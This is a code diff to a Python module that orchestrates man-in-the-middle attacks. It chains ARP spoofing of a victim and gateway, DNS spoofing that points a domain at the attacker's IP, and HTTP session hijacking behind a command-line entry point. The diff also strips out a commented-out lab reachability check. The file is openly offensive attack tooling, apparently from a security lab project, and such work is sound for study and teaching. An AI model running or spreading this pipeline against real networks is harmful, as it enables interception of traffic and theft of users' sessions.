@@ -1,108 +1,103 @@
+"""
+src/core/mitm_pipeline.py: Orchestrates MITM attacks.
+"""
+
 import time
 import os
 
 from src.attacks.arp_spoofing import start_arp_spoof
 from src.attacks.dns_spoofing import DnsSpoofingAttack
 from src.attacks.HTTP_session_hijacking import HTTPSessionHijacker
-# from src.attacks.ssl_strip import SslStripAttack # Placeholder for when SSL strip is implemented
-
 from .config import load_config
-from .network import check_lab_reachability, enable_ip_forwarding
+from .network import enable_ip_forwarding
 
-""" src/core/mitm_pipeline.py: Module for managing MITM attack pipelines.
-    Provides functions to set up, monitor, and tear down MITM attack pipelines. """
 
 def teardown_pipeline(running_threads: dict):
-    """Stops all running attack threads and restores network state."""
-    print("\n[INFO] Starting MITM pipeline teardown...")
+    """Stops all attack threads + disables IP forwarding."""
+    print("\n[INFO] Starting MITM teardown...")
 
-    # Stop all running attack threads
     for name, thread in running_threads.items():
         if thread.is_alive():
-            print(f"[INFO] Stopping {name} thread...")
+            print(f"[INFO] Stopping {name}...")
             thread.stop()
             thread.join(timeout=5)
-            if thread.is_alive():
-                print(f"[WARNING] {name} thread did not terminate gracefully.")
 
-    # Disable IP forwarding after all attacks are stopped
+    # Disable IP forwarding
     try:
-        if os.name == 'posix':
-            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write('0')
-            print("[INFO] IP forwarding disabled.")
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+            f.write('0')
+        print("[INFO] IP forwarding disabled.")
     except Exception as e:
-        print(f"[ERROR] Failed to disable IP forwarding: {e}")
+        print(f"[ERROR] Failed disabling IP forwarding: {e}")
 
-    print("[INFO] Teardown complete. Exiting.")
+    print("[INFO] Teardown complete.")
+
 
 def run(mode: str):
-    """ Run the MITM pipeline based on the specified mode. """
+    """Runs the MITM pipeline."""
     config = load_config()
     running_threads = {}
 
     try:
-        # Initial setup and validation
-        # Note: A bug in the original check_lab_reachability has been noted, but not fixed here.
-        # reachability = check_lab_reachability()
-        # if not all(reachability.values()):
-        #     print("One or more lab components are unreachable.")
-        #     return
-
+        # IP forwarding
         if not enable_ip_forwarding():
-            raise RuntimeError("Failed to enable IP forwarding. Cannot proceed with MITM.")
+            raise RuntimeError("IP forwarding could not be enabled!")
 
-        # --- Start Foundational Attacks ---
-        # ARP Spoofing is foundational for most MITM attacks.
-        if "arp" in mode or "dns" in mode or "ssl" in mode:
-            victim_ip = config["victim"]["ip"]
-            gateway_ip = config["gateway"]["ip"]
-            arp_spoofer = start_arp_spoof(victim_ip, gateway_ip)
-            if arp_spoofer:
-                running_threads['arp'] = arp_spoofer
-            else:
-                raise RuntimeError("ARP Spoofing failed to start. Cannot proceed.")
+        victim_ip = config["victim"]["ip"]
+        gateway_ip = config["gateway"]["ip"]
+        attacker_iface = config["attacker"]["interface"]
+        attacker_ip = config["attacker"]["ip"]
+        domain_name = config["domain"]["name"]
 
-        # --- Start Payload Attacks ---
-        # These attacks run concurrently after the MITM is established.
+        # --- ARP Spoofing Required for All Attacks ---
+        if any(x in mode for x in ["arp", "dns", "ssl", "session"]):
+            arp_spoofer = start_arp_spoof(victim_ip, gateway_ip, attacker_iface)
+            if not arp_spoofer:
+                raise RuntimeError("ARP Spoofer failed to start.")
+            running_threads["arp"] = arp_spoofer
+
+        # --- DNS Spoofing ---
         if "dns" in mode:
-            domain_name = config["domain"]["name"]
-            attacker_ip = config["attacker"]["ip"]
             dns_spoofer = DnsSpoofingAttack(domain=domain_name, fake_ip=attacker_ip)
             dns_spoofer.start()
-            running_threads['dns'] = dns_spoofer
-        
-        if "ssl" in mode:
-            print("[WARNING] SSL Stripping is not yet implemented.")
-            # When implemented, it would be another thread:
-            # ssl_stripper = SslStripAttack()
-            # ssl_stripper.start()
-            # running_threads['ssl'] = ssl_stripper
+            running_threads["dns"] = dns_spoofer
 
+        # --- SSL Stripping (not implemented yet) ---
+        if "ssl" in mode:
+            print("[WARNING] SSL stripping not implemented.")
+
+        # --- HTTP Session Hijacking ---
         if "session" in mode:
             hijacker = HTTPSessionHijacker(
-                target_domain=config["domain"]["name"],
-                target_ip=config["attacker"]["ip"],
-                victim_ip=config["victim"]["ip"],
-                interface=config["attacker"]["interface"]
+                target_domain=domain_name,
+                target_ip=attacker_ip,
+                victim_ip=victim_ip,
+                interface=attacker_iface,
             )
             hijacker.start()
             running_threads["session"] = hijacker
 
-        # Keep the main thread alive while attacks are running
-        if running_threads:
-            print(f"\n[INFO] MITM pipeline running with modes: {list(running_threads.keys())}.")
-            print("Press Ctrl+C to stop attacks and restore network state.")
-            while True:
-                time.sleep(1)
-        else:
-            print(f"Unknown or no mode specified: {mode}")
+        # Keep alive
+        print(f"\n[INFO] MITM pipeline running: {list(running_threads.keys())}")
+        print("[INFO] Press Ctrl+C to stop.\n")
+
+        while True:
+            time.sleep(1)
 
     except KeyboardInterrupt:
-        print("\n[INTERRUPT] Received user interrupt (Ctrl+C).")
+        print("\n[INTERRUPT] Ctrl+C pressed by user.")
     except Exception as e:
-        print(f"[FATAL ERROR] Pipeline terminated unexpectedly: {e}")
+        print(f"[FATAL ERROR] {e}")
     finally:
-        # Ensure cleanup runs regardless of how the script exits
         teardown_pipeline(running_threads)
 
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print("Usage: python3 -m src.core.mitm_pipeline <mode>")
+        print("Modes: arp, dns, session, ssl")
+        sys.exit(1)
+
+    mode = sys.argv[1]
+    run(mode)
